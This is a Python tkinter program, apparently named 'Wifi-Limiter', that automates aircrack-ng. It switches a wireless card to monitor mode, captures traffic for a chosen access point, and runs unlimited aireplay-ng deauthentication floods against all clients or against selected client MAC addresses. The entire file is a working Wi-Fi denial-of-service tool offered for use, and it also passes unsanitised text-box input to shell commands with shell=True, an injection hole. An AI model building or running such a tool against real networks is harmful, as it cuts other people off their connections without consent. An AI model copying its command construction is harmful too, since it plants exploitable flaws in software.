import subprocess
import tkinter as tk
import threading
from time import sleep

def get_interfaces():
    iw = subprocess.getoutput("iw dev | grep Interface | awk '{print $2}'")
    return iw.split("\n")

def get_connected_bssid(interface):
    return subprocess.getoutput(f"iw dev {interface} link | grep Connected | awk '{{print $3}}'")

def on_select(value):
    global wifi_interface
    wifi_interface = value
    entry_bssid.delete(0, tk.END)
    entry_bssid.insert(0, get_connected_bssid(wifi_interface))

def update_option_menu():
    global option_menu
    interfaces = get_interfaces()
    option_menu['menu'].delete(0, 'end')
    for interface in interfaces:
        option_menu['menu'].add_command(label=interface, command=tk._setit(selected_option, interface, on_select))
    if wifi_interface in interfaces:
        selected_option.set(wifi_interface)
    else:
        selected_option.set(interfaces[0])

def run_command(command):
    process = subprocess.Popen(command, shell=True)
    process.communicate()

def monitor():
    def run_monitor():
        global wifi_interface
        if not wifi_interface.endswith('mon'):
            subprocess.run(["sudo", "airmon-ng", "start", wifi_interface])
            sleep(2)  # Wait for the interface to be created
            update_option_menu()
        else:
            print('Already in monitor mode')
    
    threading.Thread(target=run_monitor).start()

def airodump():
    def run_airodump():
        global wifi_interface_mon
        interfaces = get_interfaces()
        wifi_interface_mon = next((i for i in interfaces if i.startswith(wifi_interface[:3])), wifi_interface)
        
        selected_bssid = entry_bssid.get()
        selected_channel = entry_channel.get()
        
        # Run airodump-ng with specified bssid and channel
        command = f"xfce4-terminal --hold -e 'sudo airodump-ng --bssid {selected_bssid} --channel {selected_channel} {wifi_interface_mon}'"
        print(command)
        threading.Thread(target=run_command, args=(command,)).start()

    threading.Thread(target=run_airodump).start()

def aireplay_all():
    def run_aireplay_all():

        selected_bssid = entry_bssid.get()

        command = f"xterm -hold -e 'sudo aireplay-ng -0 0 -a {selected_bssid} {wifi_interface_mon}'"
        print(command)
        threading.Thread(target=run_command, args=(command,)).start()
    
    threading.Thread(target=run_aireplay_all).start()

def aireplay_selective():
    def run_aireplay_selective():
        selected_bssid = entry_bssid.get()
        commands = []
        for entry in entries:
            client = entry.get()
            if client:
                command = f"xterm -hold -T '{selected_bssid}-->{client}' -e 'sudo aireplay-ng -0 0 -a {selected_bssid} -c {client} {wifi_interface_mon}'"
                commands.append(command)
        
        for command in commands:
            threading.Thread(target=subprocess.run, args=(command,), kwargs={'shell': True}).start()
    
    threading.Thread(target=run_aireplay_selective).start()

def stop_monitoring():
    def run_stop_monitoring():
        global wifi_interface_mon
        interface_to_stop = wifi_interface_mon if wifi_interface_mon else wifi_interface
        subprocess.run(["sudo", "airmon-ng", "stop", interface_to_stop])
        wifi_interface_mon = ''  # Reset monitor interface variable
        update_option_menu()
    
    threading.Thread(target=run_stop_monitoring).start()

def scan_aps():
    command = "xfce4-terminal --hold -e 'nmcli device wifi'"
    threading.Thread(target=run_command, args=(command,)).start()

# Initialize variables
wifi_interface = get_interfaces()[0]
vic_bssid = get_connected_bssid(wifi_interface)
wifi_interface_mon = ''

# Create the main window
root = tk.Tk()
root.title("Wifi-Limiter (^_^)")

selected_option = tk.StringVar(root)
selected_option.set(wifi_interface)

option_menu = tk.OptionMenu(root, selected_option, *get_interfaces(), command=on_select)
option_menu.grid(row=0, column=0, padx=5, pady=5)

scan_button = tk.Button(root, text="Scan APs", command=scan_aps)
scan_button.grid(row=0, column=1, padx=5, pady=5)

press_button01 = tk.Button(root, text="1-Monitor", command=monitor)
press_button01.grid(row=0, column=2, padx=5, pady=5)

press_button02 = tk.Button(root, text="2-airodump", command=airodump)
press_button02.grid(row=1, column=2, padx=5, pady=5)

entry_bssid = tk.Entry(root, width=30, fg='grey')
entry_bssid.insert(0, vic_bssid)
entry_bssid.grid(row=1, column=0, padx=5, pady=5)

entry_channel = tk.Entry(root, width=30, fg='grey')
entry_channel.insert(0, "Enter channel")
entry_channel.grid(row=2, column=0, padx=5, pady=5)

press_button03 = tk.Button(root, text="3-aireplay-all", command=aireplay_all)
press_button03.grid(row=3, column=0, columnspan=2, sticky="nsew", padx=5, pady=5)

entries = []
for i in range(2, 22):
    entry = tk.Entry(root, width=30)
    entry.grid(row=i+2, column=0, padx=5, pady=5, columnspan=2)
    entries.append(entry)

press_button04 = tk.Button(root, text="3-aireplay", command=aireplay_selective)
press_button04.grid(row=3, column=2, rowspan=len(entries), sticky="nsew", padx=5, pady=5)

press_button05 = tk.Button(root, text="STOP MONITORING", command=stop_monitoring)
press_button05.grid(row=len(entries)+3, column=0, columnspan=3, sticky="nsew", padx=5, pady=5)

# Run the GUI loop
root.mainloop()